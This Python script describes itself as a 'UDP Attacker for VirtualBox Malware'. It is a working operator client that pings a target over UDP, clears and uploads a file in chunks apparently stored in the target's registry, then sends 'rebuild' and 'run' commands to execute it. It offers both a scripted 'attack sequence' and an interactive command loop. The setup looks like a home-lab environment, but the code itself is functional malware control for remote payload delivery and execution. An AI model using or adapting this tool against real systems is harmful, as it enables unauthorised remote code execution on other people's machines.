import socket
import argparse
import os
import time
import struct

UDP_PORT = 5555
CHUNK_SIZE = 1024

def send_command(target_ip, command, port=UDP_PORT, expect_response=True):
    """Send a text command to the target"""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(command.encode(), (target_ip, port))
        print(f"[+] Sent command: {command}")
        
        if expect_response:
            try:
                sock.settimeout(3.0)
                response, _ = sock.recvfrom(1024)
                print(f"[Response] {response.decode()}")
                return True
            except socket.timeout:
                print("[!] No response received")
                return False
        return True

def send_file(target_ip, file_path, port=UDP_PORT):
    """Send a file in chunks to the target with improved reliability"""
    if not os.path.exists(file_path):
        print(f"[!] File not found: {file_path}")
        return False
    
    file_size = os.path.getsize(file_path)
    print(f"[*] Sending {file_path} ({file_size} bytes) to {target_ip}")
    
    with open(file_path, "rb") as f:
        chunk_index = 0
        while True:
            chunk = f.read(CHUNK_SIZE)
            if not chunk:
                break
                
            # Format: chunk:<index>:<binary data>
            packet = f"chunk:{chunk_index}:".encode() + chunk
            
            success = False
            retries = 3
            while retries > 0 and not success:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.sendto(packet, (target_ip, port))
                    try:
                        sock.settimeout(1.0)
                        response, _ = sock.recvfrom(1024)
                        if b"Chunk stored" in response:
                            print(f"[+] Chunk {chunk_index} ACK: {response.decode()}")
                            success = True
                        else:
                            print(f"[!] Unexpected response: {response.decode()}")
                    except socket.timeout:
                        print(f"[!] Timeout on chunk {chunk_index}, retrying...")
                        retries -= 1
            
            if not success:
                print(f"[!] Failed to send chunk {chunk_index} after 3 attempts")
                return False
                
            chunk_index += 1
            time.sleep(0.01)  # Small delay to prevent packet loss

    print(f"[*] File transfer complete. Sent {chunk_index} chunks")
    return True

def execute_sequence(target_ip, file_path=None, port=UDP_PORT):
    """Full sequence: clear, upload, rebuild, and execute with verification"""
    print("[*] Starting full attack sequence")
    
    # 0. Test connectivity
    if not send_command(target_ip, "ping", port):
        print("[!] Target not responding to ping")
        return False
    
    # 1. Clear existing chunks
    if not send_command(target_ip, "clear", port):
        print("[!] Clear command failed")
        return False
    
    if file_path:
        # 2. Upload new file
        if not send_file(target_ip, file_path, port):
            return False
        
        # 3. Rebuild file
        if not send_command(target_ip, "rebuild", port):
            print("[!] Rebuild command failed")
            return False
        
        # 4. Execute file
        if not send_command(target_ip, "run", port):
            print("[!] Run command failed")
            return False
    
    print("[*] Attack sequence completed successfully")
    return True

def find_vbox_host_only_ip():
    """Attempt to discover VirtualBox host-only IP automatically"""
    # Common VirtualBox host-only subnets
    common_subnets = [
        "192.168.56.",  # Default VirtualBox host-only network
        "192.168.57.",
        "192.168.58.",
        "192.168.59."
    ]
    
    # Check local interfaces
    hostname = socket.gethostname()
    local_ips = socket.gethostbyname_ex(hostname)[2]
    
    for ip in local_ips:
        for subnet in common_subnets:
            if ip.startswith(subnet):
                return ip
    
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="UDP Attacker for VirtualBox Malware")
    parser.add_argument("target", nargs="?", help="Target IP address (default: auto-discover)")
    parser.add_argument("-p", "--port", type=int, default=UDP_PORT, help="UDP port (default: 5555)")
    
    # Command options
    parser.add_argument("--cmd", help="Send a single command")
    parser.add_argument("--upload", help="Upload a file to target")
    parser.add_argument("--rebuild", action="store_true", help="Rebuild file from registry")
    parser.add_argument("--clear", action="store_true", help="Clear registry chunks")
    parser.add_argument("--run", action="store_true", help="Execute the rebuilt file")
    parser.add_argument("--auto", help="Full sequence: clear, upload, rebuild, execute")
    
    args = parser.parse_args()

    # Auto-discover target IP if not specified
    if not args.target:
        args.target = find_vbox_host_only_ip()
        if not args.target:
            print("[!] Could not auto-discover VirtualBox host-only IP")
            print("[!] Please specify target IP manually")
            exit(1)
        print(f"[*] Using auto-discovered target IP: {args.target}")

    if args.cmd:
        send_command(args.target, args.cmd, args.port)
    elif args.upload:
        send_file(args.target, args.upload, args.port)
    elif args.rebuild:
        send_command(args.target, "rebuild", args.port)
    elif args.clear:
        send_command(args.target, "clear", args.port)
    elif args.run:
        send_command(args.target, "run", args.port)
    elif args.auto:
        execute_sequence(args.target, args.auto, args.port)
    else:
        # Interactive mode
        print(f"[*] Interactive mode with target {args.target}:{args.port}")
        print("Commands: upload, rebuild, clear, run, ping, exit")
        
        while True:
            try:
                cmd = input("cmd> ").strip()
                if not cmd:
                    continue
                    
                if cmd == "exit":
                    break
                    
                if cmd.startswith("upload "):
                    _, file_path = cmd.split(" ", 1)
                    send_file(args.target, file_path, args.port)
                elif cmd == "rebuild":
                    send_command(args.target, "rebuild", args.port)
                elif cmd == "clear":
                    send_command(args.target, "clear", args.port)
                elif cmd == "run":
                    send_command(args.target, "run", args.port)
                elif cmd == "ping":
                    send_command(args.target, "ping", args.port)
                else:
                    print("Unknown command. Valid commands: upload, rebuild, clear, run, exit")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[!] Error: {str(e)}")
